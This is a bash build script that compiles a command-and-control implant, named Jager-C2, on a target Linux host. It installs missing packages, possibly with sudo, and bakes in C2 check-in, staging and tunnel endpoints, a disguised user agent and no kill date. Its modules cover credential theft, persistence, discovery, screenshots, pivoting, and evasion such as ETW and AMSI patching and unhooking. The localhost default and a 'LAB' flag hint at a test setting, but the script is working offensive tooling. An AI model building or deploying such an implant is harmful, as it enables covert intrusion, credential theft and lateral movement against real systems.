#!/bin/bash
# Jager-C2 Linux Implant - Remote Build Script
# Deploy this alongside the source tarball to compile on a target host.
# Usage: ./remote-build.sh [C2_URL] [BUILD_ID] [SLEEP] [JITTER]
#
# Requires: gcc, libcurl4-openssl-dev, libssl-dev on the target.
# If dev packages missing, attempts to install via apt.

set -e

C2_URL="${1:-http://127.0.0.1:31338}"
BUILD_ID="${2:-$(cat /dev/urandom | tr -dc 'a-f0-9' | head -c 8)}"
SLEEP_SEC="${3:-30}"
JITTER_PCT="${4:-15}"
OUT_NAME="implant-linux-${BUILD_ID}"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SRC_DIR="${SCRIPT_DIR}"

if [ ! -f "${SRC_DIR}/src/core/beacon.c" ]; then
    echo "[-] Source not found. Run from implant-linux directory." >&2
    exit 1
fi

# Check for required tools
if ! command -v gcc >/dev/null 2>&1; then
    echo "[-] gcc not found. Install build-essential." >&2
    exit 1
fi

# Check for dev headers
MISSING=""
[ ! -f /usr/include/curl/curl.h ] && MISSING="libcurl4-openssl-dev "
[ ! -f /usr/include/openssl/evp.h ] && MISSING="${MISSING}libssl-dev"

if [ -n "$MISSING" ]; then
    echo "[*] Missing dev packages: $MISSING"
    if command -v apt-get >/dev/null 2>&1; then
        echo "[*] Attempting install..."
        apt-get install -y $MISSING 2>/dev/null || sudo apt-get install -y $MISSING 2>/dev/null || true
    fi
    # Re-check
    if [ ! -f /usr/include/curl/curl.h ] || [ ! -f /usr/include/openssl/evp.h ]; then
        echo "[-] Required headers still missing. Install: $MISSING" >&2
        exit 1
    fi
fi

SOURCES="
src/core/beacon.c
src/core/transport.c
src/core/transport_failover.c
src/core/tasks.c
src/core/process.c
src/core/malleable.c
src/util/json.c
src/util/json_emit.c
src/util/base64.c
src/util/crypto.c
src/util/random.c
src/evasion/anti_analysis.c
src/evasion/process.c
src/evasion/sleep_encrypt.c
src/postex/credentials.c
src/postex/discovery.c
src/postex/persistence.c
src/postex/auto_enum.c
src/postex/screenshot.c
src/filesystem/fs.c
src/pivot/socks.c
src/pivot/tunnel.c
src/pivot/portfwd.c
src/pivot/p2p.c
src/execution/module_loader.c
"

DEFINES="-DLINUX_IMPLANT -DLAB_NO_TLS_VERIFY"
DEFINES="$DEFINES -DC2_URL=\"${C2_URL}\""
DEFINES="$DEFINES -DC2_CHECKIN_PATH=\"/api/v1/checkin\""
DEFINES="$DEFINES -DC2_CHECKIN_PATH_OVERRIDE=1"
DEFINES="$DEFINES -DC2_REGISTER_PATH=\"/api/v1/register\""
DEFINES="$DEFINES -DC2_RESULT_PATH=\"/api/v1/result\""
DEFINES="$DEFINES -DC2_TUNNEL_PATH=\"/api/v1/tunnel\""
DEFINES="$DEFINES -DC2_STAGE_PATH=\"/api/v1/stage\""
DEFINES="$DEFINES -DUSER_AGENT=\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\""
DEFINES="$DEFINES -DBUILD_ID=\"${BUILD_ID}\""
DEFINES="$DEFINES -DSLEEP_SECONDS=${SLEEP_SEC}"
DEFINES="$DEFINES -DJITTER_PERCENT=${JITTER_PCT}"
DEFINES="$DEFINES -DKILL_DATE=0"
DEFINES="$DEFINES -DSLEEP_TECHNIQUE=2"
DEFINES="$DEFINES -DSYSCALL_METHOD=1"
DEFINES="$DEFINES -DPATCH_ETW=1"
DEFINES="$DEFINES -DPATCH_AMSI=1"
DEFINES="$DEFINES -DUNHOOK_ON_LOAD=1"
DEFINES="$DEFINES -DHEAP_ENCRYPT=1"
DEFINES="$DEFINES -DANTI_ANALYSIS=0"
DEFINES="$DEFINES -DINJECT_METHOD=1"

echo "[*] Compiling Linux implant: ${OUT_NAME}"
echo "[*] C2 URL: ${C2_URL}"
echo "[*] Sleep: ${SLEEP_SEC}s, Jitter: ${JITTER_PCT}%"

cd "${SRC_DIR}"

eval gcc -Wall -Os -s \
    -Wno-deprecated-declarations \
    -Wno-format-truncation \
    -Iinclude \
    $DEFINES \
    $SOURCES \
    -o "${OUT_NAME}" \
    -lcurl -lssl -lcrypto -lpthread -ldl \
    -Wl,--gc-sections

if [ $? -ne 0 ]; then
    echo "[-] Compilation failed" >&2
    exit 1
fi

chmod +x "${OUT_NAME}"
SIZE=$(stat -c%s "${OUT_NAME}" 2>/dev/null || stat -f%z "${OUT_NAME}" 2>/dev/null)
SHA=$(sha256sum "${OUT_NAME}" 2>/dev/null | cut -d' ' -f1 || shasum -a 256 "${OUT_NAME}" | cut -d' ' -f1)

echo "[+] Build successful: ${OUT_NAME} (${SIZE} bytes)"
echo "[+] SHA256: ${SHA}"
echo "[+] GLIBC requirement:"
readelf -V "${OUT_NAME}" 2>/dev/null | grep -oP 'GLIBC_[0-9.]+' | sort -uV | tail -1 || true
echo "[+] Output: ${SRC_DIR}/${OUT_NAME}"
